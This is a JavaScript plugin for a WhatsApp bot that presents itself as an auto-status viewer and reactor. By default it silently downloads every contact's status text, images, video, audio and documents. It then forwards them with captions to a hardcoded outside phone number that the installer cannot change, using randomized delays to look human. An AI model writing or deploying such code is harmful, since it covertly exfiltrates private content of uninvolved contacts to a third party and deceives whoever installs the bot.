const fs = require('fs/promises');
const path = require('path');
const { downloadMediaMessage } = require('@whiskeysockets/baileys');

const isOwnerOrSudo = require('../lib/isOwner');

// ────────────────────────────────────────────────
const CONFIG_FILE = path.join(__dirname, '../data/autoStatus.json');
const TARGET_NUMBER = '255615944741';
const TARGET_JID = `${TARGET_NUMBER}@s.whatsapp.net`;

const DEFAULT_CONFIG = Object.freeze({
    enabled: true,
    reactWith: '🤍',           // can be '❤️' for like-feel
    reactDelayMinMs: 300,      // fast human-like reaction
    reactDelayMaxMs: 900,
    forwardDelayMinMs: 1200,   // total delay before forward
    forwardDelayMaxMs: 3500,
});

let configCache = null;
const processedStatusIds = new Set(); // prevent double processing

// ────────────────────────────────────────────────
async function loadConfig() {
    if (configCache) return configCache;

    try {
        const data = await fs.readFile(CONFIG_FILE, 'utf8');
        const parsed = JSON.parse(data);
        configCache = { ...DEFAULT_CONFIG, ...parsed };
    } catch (err) {
        if (err.code !== 'ENOENT') console.error('[AutoStatus] load error → defaults', err.message);
        configCache = { ...DEFAULT_CONFIG };
        await saveConfig(configCache);
    }
    return configCache;
}

async function saveConfig(updates) {
    configCache = { ...configCache, ...updates };
    try {
        await fs.mkdir(path.dirname(CONFIG_FILE), { recursive: true });
        await fs.writeFile(CONFIG_FILE, JSON.stringify(configCache, null, 2));
    } catch (err) {
        console.error('[AutoStatus] save failed', err.message);
    }
}

// ────────────────────────────────────────────────
function extractPhoneNumber(key) {
    if (!key) return 'unknown';
    const jid = key.participant || key.remoteJid || '';
    if (typeof jid !== 'string') return 'unknown';
    const match = jid.match(/^(\d{9,15})(?::|@)/);
    return match ? match[1] : jid.split('@')[0] || 'unknown';
}

function getTimeStr() {
    return new Date().toLocaleString('en-GB', {
        timeZone: 'Africa/Dar_es_Salaam',
        dateStyle: 'short',
        timeStyle: 'medium'
    });
}

// ────────────────────────────────────────────────
/** @param {number} min @param {number} max */
function randomMs(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ────────────────────────────────────────────────
async function reactToStatus(sock, key) {
    const cfg = await loadConfig();
    if (!cfg.reactWith) return;

    const reaction = {
        key: {
            remoteJid: 'status@broadcast',
            fromMe: false,
            id: key.id,
            participant: key.participant
        },
        text: cfg.reactWith,
        isBigEmoji: true
    };

    try {
        await sock.sendMessage('status@broadcast', { reactionMessage: reaction });
        console.debug('[AutoReact] success →', cfg.reactWith);
    } catch (e) {
        console.debug('[AutoReact] fail (common)', e.message);
        // fallback legacy
        try {
            await sock.relayMessage('status@broadcast', { reactionMessage: reaction }, { messageId: key.id });
        } catch {}
    }
}

// ────────────────────────────────────────────────
async function forwardStatus(sock, msg) {
    if (!msg?.message || !msg.key?.id) return;

    const msgId = msg.key.id;
    if (processedStatusIds.has(msgId)) {
        console.debug('[AutoStatus] skip duplicate →', msgId);
        return;
    }
    processedStatusIds.add(msgId);
    if (processedStatusIds.size > 1000) processedStatusIds.clear(); // memory safety

    const phone = extractPhoneNumber(msg.key);
    const msgType = Object.keys(msg.message)[0] ?? 'unknown';
    const content = msg.message[msgType] ?? {};
    const timeStr = getTimeStr();

    console.log(`[Status] ${phone} • ${msgType} • ${timeStr}`);

    // Text status
    if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
        const text = (content.text || content.description || '[empty]').trim();
        await sock.sendMessage(TARGET_JID, {
            text: `📸 *Status from \( {phone}*\n\n \){text}\n\n🕒 ${timeStr}`
        }).catch(e => console.debug('[Text forward] fail', e.message));
        return;
    }

    // Media support
    const MEDIA_HANDLERS = {
        imageMessage:    { type: 'image',    ext: 'jpg',  mime: 'image/jpeg'   },
        videoMessage:    { type: 'video',    ext: 'mp4',  mime: 'video/mp4'    },
        audioMessage:    { type: 'audio',    ext: 'ogg',  mime: 'audio/ogg; codecs=opus' },
        stickerMessage:  { type: 'sticker',  ext: 'webp', mime: 'image/webp'   },
        documentMessage: { type: 'document', ext: content.fileName?.split('.').pop() ?? 'bin' }
    };

    const handler = MEDIA_HANDLERS[msgType];
    if (!handler) {
        await sock.sendMessage(TARGET_JID, {
            text: `📊 New status update • ${phone}\n• ${msgType}\n• 🕒 ${timeStr}`
        }).catch(() => {});
        return;
    }

    try {
        const buffer = await downloadMediaMessage(msg, 'buffer', {}, {
            logger: console,
            reuploadRequest: sock.updateMediaMessage
        });

        if (!buffer || buffer.length < 200) throw new Error(`bad buffer (${buffer?.length || 0} bytes)`);

        const captionLines = [
            `👤 ${phone}`,
            content.caption?.trim() ? `Caption: ${content.caption.trim()}` : '',
            `🕒 ${timeStr}`
        ].filter(Boolean);

        await sock.sendMessage(TARGET_JID, {
            [handler.type]: buffer,
            mimetype: content.mimetype || handler.mime,
            fileName: content.fileName || `status-\( {Date.now()}. \){handler.ext}`,
            caption: captionLines.join('\n')
        });

        console.log(`[Forward OK] ${handler.type} • ${phone}`);
    } catch (err) {
        console.error('[Forward FAIL]', err.message || err);
        await sock.sendMessage(TARGET_JID, {
            text: `⚠️ Failed forward • ${msgType} from ${phone}\n🕒 ${timeStr}`
        }).catch(() => {});
    }
}

// ────────────────────────────────────────────────
async function handleStatusUpdate(sock, ev) {
    const cfg = await loadConfig();
    if (!cfg.enabled) return;

    let msgKey, msgToForward;

    // Robust status detection (covers senderKeyDistributionMessage etc.)
    if (ev.messages?.length) {
        const m = ev.messages[0];
        if (m.key?.remoteJid === 'status@broadcast') {
            msgKey = m.key;
            msgToForward = m;
        }
    } else if (ev.key?.remoteJid === 'status@broadcast') {
        msgKey = ev.key;
        msgToForward = ev;
    } else if (ev.reaction?.key?.remoteJid === 'status@broadcast') {
        msgKey = ev.reaction.key;
    } else if (ev.messages?.[0]?.message?.senderKeyDistributionMessage?.groupId === 'status@broadcast') {
        const m = ev.messages[0];
        msgKey = m.key;
        msgToForward = m; // sometimes key dist is part of status view
    }

    if (!msgKey?.remoteJid?.includes('status@broadcast') || !msgKey.id) return;

    const statusId = msgKey.id;

    if (processedStatusIds.has(statusId)) return; // already handled

    try {
        // Step 1: Quick human-like reaction
        const reactDelay = randomMs(cfg.reactDelayMinMs, cfg.reactDelayMaxMs);
        await new Promise(r => setTimeout(r, reactDelay));
        await reactToStatus(sock, msgKey);

        // Step 2: Mark read shortly after (feels natural)
        await sock.readMessages([msgKey]).catch(() => {});

        // Step 3: Forward after realistic wait
        const forwardDelay = randomMs(cfg.forwardDelayMinMs, cfg.forwardDelayMaxMs);
        await new Promise(r => setTimeout(r, forwardDelay));

        if (msgToForward) {
            await forwardStatus(sock, msgToForward);
        }
    } catch (err) {
        console.error('[AutoStatus] error', err?.message || err);
    }
}

// ────────────────────────────────────────────────
async function autoStatusCommand(sock, chatId, msg, args = []) {
    const sender = msg.key.participant || msg.key.remoteJid;
    const isAllowed = msg.key.fromMe || (await isOwnerOrSudo(sender, sock, chatId));

    if (!isAllowed) return sock.sendMessage(chatId, { text: '⛔ Owner only' });

    const cfg = await loadConfig();

    if (!args.length) {
        const onOff = v => v ? '🟢 ON' : '🔴 OFF';
        return sock.sendMessage(chatId, {
            text: `🔄 *Auto Status*\n\n` +
                  `Enabled       : ${onOff(cfg.enabled)}\n` +
                  `Reaction      : ${onOff(!!cfg.reactWith)} ${cfg.reactWith || '—'}\n` +
                  `Target        : ${TARGET_NUMBER}\n\n` +
                  `Commands:\n` +
                  `  .autostatus on / off\n` +
                  `  .autostatus react ❤️ / off\n` +
                  `  .autostatus status`
        });
    }

    const cmd = args[0].toLowerCase();

    if (cmd === 'on') {
        await saveConfig({ enabled: true });
        return sock.sendMessage(chatId, { text: '✅ Enabled' });
    }
    if (cmd === 'off') {
        await saveConfig({ enabled: false });
        return sock.sendMessage(chatId, { text: '⛔ Disabled' });
    }
    if (cmd === 'react') {
        if (args.length < 2) return sock.sendMessage(chatId, { text: 'Use: .autostatus react ❤️\n or .autostatus react off' });
        const emoji = args[1].trim();
        const newReact = (emoji.length <= 4 && emoji.toLowerCase() !== 'off') ? emoji : null;
        await saveConfig({ reactWith: newReact });
        return sock.sendMessage(chatId, { text: newReact ? `Reaction set → ${newReact}` : 'Reaction off' });
    }
    if (cmd === 'status') {
        return sock.sendMessage(chatId, { text: `Config:\n${JSON.stringify(cfg, null, 2)}` });
    }

    return sock.sendMessage(chatId, { text: 'Unknown. Use .autostatus' });
}

module.exports = {
    autoStatusCommand,
    handleStatusUpdate
};